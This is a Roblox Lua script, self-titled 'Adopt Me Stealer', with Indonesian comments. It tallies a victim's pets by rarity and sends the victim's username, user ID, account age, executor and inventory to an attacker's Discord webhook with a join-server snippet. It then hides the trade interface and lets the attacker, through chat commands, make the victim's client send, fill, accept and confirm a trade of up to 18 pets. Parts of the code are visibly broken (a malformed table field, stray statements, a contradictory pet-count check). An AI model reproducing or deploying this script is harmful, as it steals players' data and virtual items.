local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')
-- Inisialisasi rarity_counts dan property_counts
local rarity_counts = {
    legendary = 0,
    ultra_rare = 0,
    rare = 0,
    uncommon = 0,
    common = 0
}

local property_counts = {
    mega_neon = 0,
    neon = 0
}

-- Iterasi untuk menghitung pets
for i, pet in pairs(ClientData.get("inventory").pets) do
    local rarity = InventoryDB[pet.category][pet.id].rarity
    local property = InventoryDB[pet.category][pet.id].properties

    -- Hitung berdasarkan rarity
    if rarity == "legendary" then
        rarity_counts.legendary = rarity_counts.legendary + 1
    elseif rarity == "ultra_rare" then
        rarity_counts.ultra_rare = rarity_counts.ultra_rare + 1
    elseif rarity == "rare" then
        rarity_counts.rare = rarity_counts.rare + 1
    elseif rarity == "uncommon" then
        rarity_counts.uncommon = rarity_counts.uncommon + 1
    elseif rarity == "common" then
        rarity_counts.common = rarity_counts.common + 1
    end

    -- Hitung berdasarkan properti (Mega Neon dan Neon)
    if property == "mega_neon" then
        property_counts.mega_neon = property_counts.mega_neon + 1
    elseif property == "neon" then
        property_counts.neon = property_counts.neon + 1
    end
end

-- Total semua pets
local total_pets = rarity_counts.legendary + rarity_counts.ultra_rare + rarity_counts.rare +
                   rarity_counts.uncommon + rarity_counts.common

-- Jika tidak ada pets, kirim pesan kosong
if total_pets == 2 then
    message:reply("Victim is broke asf")
    game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 2 pet in your inventory or use this script on your main account.")
    return
end
local exploit
local function getexploit()
    local exploitt =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "KRNL") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getscriptenvs and "Calamari") or
        (unit and not syn and "Unit") or
        (OXYGEN_LOADED and "Oxygen U") or
        (IsElectron and "Electron") or
        ("Couldnt Grab")

    exploit = exploitt
end
getexploit()
local plr = game.Players.LocalPlayer
local userid = game.Players.LocalPlayer.UserId
local accage = game.Players.LocalPlayer.AccountAge
local data = {
  username = 'Kenn | Adopt Me Stealer!!',
  avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&',
  content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
  embed = {
    {
      title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
      description = '**ðŸ“„  Player Information**: \n ```lua\nðŸ”Œ Executor: '.. tostring(exploit) ..'\nðŸ—½ Username: '.. tostring(plr) ..'\nðŸ—¼ User-ID: '.. tostring(userid) ..'\nâ›© Account Age: '.. tostring(accage) ..'\nðŸ— Receiver: '.. Username ..'```',
      color = 10428396,
      fields {{name = "ðŸ¦’Legendary", value = tostring(rarity_counts.legendary), inline = true},
      {name = "ðŸŠ Ultra Rare", value = tostring(rarity_counts.ultra_rare), inline = true},
      {name = "ðŸŒ Rare", value = tostring(rarity_counts.rare), inline = true},
      {name = "ðŸ¦€ Uncommon", value = tostring(rarity_counts.uncommon), inline = true},
      {name = "ðŸˆ Common", value = tostring(rarity_counts.common), inline = true},
      {name = "ðŸ‰ Mega Neon", value = tostring(property_counts.mega_neon), inline = false},
      {name = "ðŸ¦– Neon", value = tostring(property_counts.neon), inline = false},
      {name = "ðŸ¦„ Total Pets", value = tostring(total_pets), inline = false}},
      footer = {text = "ðŸ“¦ Inventory Summary", icon_url = "https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&"},
      timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ') -- Timestamp UTC
    }
    message:reply {
        embed = embed
    }
  }
}
local httpRequest = http.request or httprequest
if httpRequest then
  httpRequest({
    Url = Webhook,
    Method = 'POST',
    Headers = {
      ['Content-Type'] = 'application/json'
    },
    Body = game:GetService('HttpService'):JSONEncode(data)
  })
else
  print("LMAOOOOOO")
end

local function AcceptTrade()
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
  AcceptNegotiationRemote:FireServer()
end

local function ConfirmTrade()
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
  AcceptTradeRemote:FireServer()
end

local function SendTrade()
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")

        send_trade:FireServer(game.Players[Username])

wait(5)
  local Loads = require(game.ReplicatedStorage.Fsys).load
  local RouterClient = Loads("RouterClient")
  local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
  local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
  if juj.pets then
    local petCount = 0
    local petUids = {}
        for petUid, petData in pairs(juj.pets) do
      table.insert(petUids, petUid)
    end
    
    while #petUids > 0 do
      local petUid = table.remove(petUids, 1)
      AddPetRemote:FireServer(petUid)
      petCount = petCount + 1
      if petCount >= 18 then
        break
      end
    end
  else
    print("No pets found in inventory.")
  end
end
end

game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false

game.Players.PlayerAdded:Connect(function(player)
  if player.Name == Username then
      player.Chatted:Connect(function(msg)
          local lowerMsg = msg:lower()
          if lowerMsg == "/send" or lowerMsg == "send" then
            SendTrade()
          end
          if lowerMsg == "/accept" or lowerMsg == "accept" then
            AcceptTrade()
          end
          if lowerMsg == "/confirm" or lowerMsg == "confirm" then
            ConfirmTrade()
          end
      end)
  end
end)
